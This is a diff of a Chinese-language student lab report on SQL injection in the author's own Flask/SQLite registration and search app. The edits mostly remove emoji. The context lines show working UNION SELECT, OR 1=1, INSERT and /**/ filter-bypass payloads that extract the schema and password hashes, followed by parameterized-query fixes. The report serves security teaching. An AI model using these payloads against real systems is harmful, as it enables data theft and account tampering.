@@ -12,7 +12,7 @@
 
 ## 一、实验背景
 
-本次实验在 Day2 已修复的登录功能基础上，为系统新增了**用户注册**和**用户搜索**两个功能模块，数据存储从 Python 字典迁移到了 SQLite 数据库。
+本次实验中我在 Day2 已修复的登录功能基础上，为系统新增了**用户注册**和**用户搜索**两个功能模块，数据存储从 Python 字典迁移到了 SQLite 数据库。
 
 在软件开发中，SQL 注入是最常见、最危险的 Web 安全漏洞之一。本次实验中，我们先使用 **f-string 字符串拼接**方式构造 SQL 语句（故意制造漏洞），然后使用课堂所学的 UNION SELECT 等技术进行注入测试，最后通过**参数化查询**进行修复。
 
@@ -153,7 +153,7 @@ keyword=admin' UNION SELECT 1,2,3,4,5--
 SELECT * FROM users WHERE username LIKE '%admin' UNION SELECT 1,2,3,4,5--%' OR email LIKE ...
 ```
 
-**结果**：✅ 注入成功！页面在搜索结果中显示了 `1, 2, 4, 5`（第3列是password，模板未渲染），确认 users 表有 5 列。
+**结果**：注入成功！页面在搜索结果中显示了 `1, 2, 4, 5`（第3列是password，模板未渲染），确认 users 表有 5 列。
 
 **控制台输出**：
 ```
@@ -169,7 +169,7 @@ SELECT * FROM users WHERE username LIKE '%admin' UNION SELECT 1,2,3,4,5--%' OR e
 keyword=x' UNION SELECT 1,type,name,sql,5 FROM sqlite_master--
 ```
 
-**结果**：✅ 成功获取到完整的 CREATE TABLE 语句：
+**结果**：成功获取到完整的 CREATE TABLE 语句：
 ```sql
 CREATE TABLE users (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -191,7 +191,7 @@ CREATE TABLE users (
 keyword=x' UNION SELECT id,username,'--',password,phone FROM users--
 ```
 
-**结果**：✅ 成功获取所有用户密码哈希：
+**结果**： 成功获取所有用户密码哈希：
 ```
 admin: scrypt:32768:8:1$gOAd0wg2hWzWN6K5$bb787a29...
 alice: scrypt:32768:8:1$ApSxhwMd3Sl2AmBc$96ac5f48...
@@ -218,7 +218,7 @@ keyword=%' OR 1=1--
 SELECT * FROM users WHERE username LIKE '%%' OR 1=1--%' OR email LIKE ...
 ```
 
-**结果**：✅ 所有用户数据全部返回（包括通过注入插入的 hacker 用户）。
+**结果**：所有用户数据全部返回（包括通过注入插入的 hacker 用户）。
 
 ### 4.6 攻击五：注册接口 INSERT 注入
 
@@ -235,7 +235,7 @@ INSERT INTO users (username, password, email, phone)
 VALUES ('hacker', 'fakehash', 'hack@evil.com', '666666'); --', '...', '...', '...')
 ```
 
-**结果**：✅ 成功在数据库中插入了一条攻击者控制的记录（id=5, username=hacker, password=fakehash），且密码绕过了哈希处理。
+**结果**：成功在数据库中插入了一条攻击者控制的记录（id=5, username=hacker, password=fakehash），且密码绕过了哈希处理。
 
 ### 4.7 攻击六：简单 WAF 绕过
 
@@ -246,7 +246,7 @@ VALUES ('hacker', 'fakehash', 'hack@evil.com', '666666'); --', '...', '...', '..
 keyword=admin'/**/UNION/**/SELECT/**/1,2,3,4,5--
 ```
 
-**结果**：✅ 注入成功，`/**/` 在 SQLite 中被解析为空白，效果等同于空格。
+**结果**：注入成功，`/**/` 在 SQLite 中被解析为空白，效果等同于空格。
 
 ---
 
@@ -254,12 +254,12 @@ keyword=admin'/**/UNION/**/SELECT/**/1,2,3,4,5--
 
 | 编号 | 攻击名称 | 注入类型 | Payload 示例 | 结果 |
 |:----:|----------|----------|-------------|:----:|
-| ① | 列数探测 | UNION SELECT | `admin' UNION SELECT 1,2,3,4,5--` | ✅ 成功 |
-| ② | 表结构获取 | UNION + sqlite_master | `x' UNION SELECT 1,type,name,sql,5 FROM sqlite_master--` | ✅ 成功 |
-| ③ | 密码哈希提取 | UNION SELECT | `x' UNION SELECT id,username,'--',password,phone FROM users--` | ✅ 成功 |
-| ④ | 全量数据拖取 | OR 永真条件 | `%' OR 1=1--` | ✅ 成功 |
-| ⑤ | INSERT 注入 | 注册表单注入 | `hacker', 'fakehash', ..., '...'); --` | ✅ 成功 |
-| ⑥ | WAF 空格绕过 | /**/ 注释替换 | `admin'/**/UNION/**/SELECT/**/1,2,3,4,5--` | ✅ 成功 |
+| ① | 列数探测 | UNION SELECT | `admin' UNION SELECT 1,2,3,4,5--` | 成功 |
+| ② | 表结构获取 | UNION + sqlite_master | `x' UNION SELECT 1,type,name,sql,5 FROM sqlite_master--` | 成功 |
+| ③ | 密码哈希提取 | UNION SELECT | `x' UNION SELECT id,username,'--',password,phone FROM users--` | 成功 |
+| ④ | 全量数据拖取 | OR 永真条件 | `%' OR 1=1--` | 成功 |
+| ⑤ | INSERT 注入 | 注册表单注入 | `hacker', 'fakehash', ..., '...'); --` | 成功 |
+| ⑥ | WAF 空格绕过 | /**/ 注释替换 | `admin'/**/UNION/**/SELECT/**/1,2,3,4,5--` | 成功 |
 
 ---
 
@@ -273,22 +273,22 @@ keyword=admin'/**/UNION/**/SELECT/**/1,2,3,4,5--
 
 | 方式 | 代码示例 | 安全性 |
 |------|---------|:------:|
-| ❌ f-string 拼接 | `f"SELECT * FROM users WHERE username = '{username}'"` | 不安全 |
-| ✅ 参数化查询 | `"SELECT * FROM users WHERE username = ?", (username,)` | 安全 |
+| f-string 拼接 | `f"SELECT * FROM users WHERE username = '{username}'"` | 不安全 |
+| 参数化查询 | `"SELECT * FROM users WHERE username = ?", (username,)` | 安全 |
 
 ### 6.2 修复代码对比
 
 #### 6.2.1 搜索接口
 
 ```python
-# 修复前（❌ 不安全 — f-string 拼接）
+# 修复前（不安全 — f-string 拼接）
 sql = (
     f"SELECT * FROM users "
     f"WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
 )
 cursor.execute(sql)
 
-# 修复后（✅ 安全 — 参数化查询）
+# 修复后（安全 — 参数化查询）
 sql = "SELECT * FROM users WHERE username LIKE ? OR email LIKE ?"
 params = (f"%{keyword}%", f"%{keyword}%")
 cursor.execute(sql, params)
@@ -299,14 +299,14 @@ cursor.execute(sql, params)
 #### 6.2.2 注册接口
 
 ```python
-# 修复前（❌ 不安全 — f-string 拼接）
+# 修复前（不安全 — f-string 拼接）
 sql = (
     f"INSERT INTO users (username, password, email, phone) "
     f"VALUES ('{username}', '{hashed_pw}', '{email}', '{phone}')"
 )
 cursor.execute(sql)
 
-# 修复后（✅ 安全 — 参数化查询）
+# 修复后（安全 — 参数化查询）
 sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
 params = (username, hashed_pw, email, phone)
 cursor.execute(sql, params)
@@ -315,13 +315,13 @@ cursor.execute(sql, params)
 #### 6.2.3 数据库初始化
 
 ```python
-# 修复前（❌ 不安全 — f-string 拼接）
+# 修复前（不安全 — f-string 拼接）
 cursor.execute(
     f"INSERT OR IGNORE INTO users (username, password, email, phone) "
     f"VALUES ('admin', '{admin_pw}', 'admin@example.com', '13800138000')"
 )
 
-# 修复后（✅ 安全 — 参数化查询）
+# 修复后（安全 — 参数化查询）
 cursor.execute(
     "INSERT OR IGNORE INTO users (username, password, email, phone) "
     "VALUES (?, ?, ?, ?)",
@@ -355,12 +355,12 @@ curl -X POST "http://127.0.0.1:5000/register" \
 |--------|--------|--------|
 | SQL 构造方式 | f-string 字符串拼接 | 参数化查询（? 占位符） |
 | 用户输入处理 | 无过滤，直接拼接进 SQL | 作为参数传递，驱动自动转义 |
-| 搜索 UNION SELECT | ✅ 可成功注入 | ❌ 注入失效 |
-| 搜索 OR 永真条件 | ✅ 可批量拖取数据 | ❌ 注入失效 |
-| 注册 INSERT 注入 | ✅ 可插入恶意数据 | ❌ 注入失效 |
-| 密码绕过 | ✅ 可通过注入绕过哈希 | ❌ 无法绕过 |
-| 表结构泄露 | ✅ sqlite_master 可读 | ❌ 无法通过注入读取 |
-| WAF 绕过 | ✅ /**/ 可替代空格 | ❌ 注入本身已失效 |
+| 搜索 UNION SELECT | 可成功注入 | 注入失效 |
+| 搜索 OR 永真条件 | 可批量拖取数据 | 注入失效 |
+| 注册 INSERT 注入 | 可插入恶意数据 | 注入失效 |
+| 密码绕过 | 可通过注入绕过哈希 | 无法绕过 |
+| 表结构泄露 | sqlite_master 可读 | 无法通过注入读取 |
+| WAF 绕过 | /**/ 可替代空格 | 注入本身已失效 |
 | 正常功能 | 正常 | 正常（不受影响） |
 
 ---
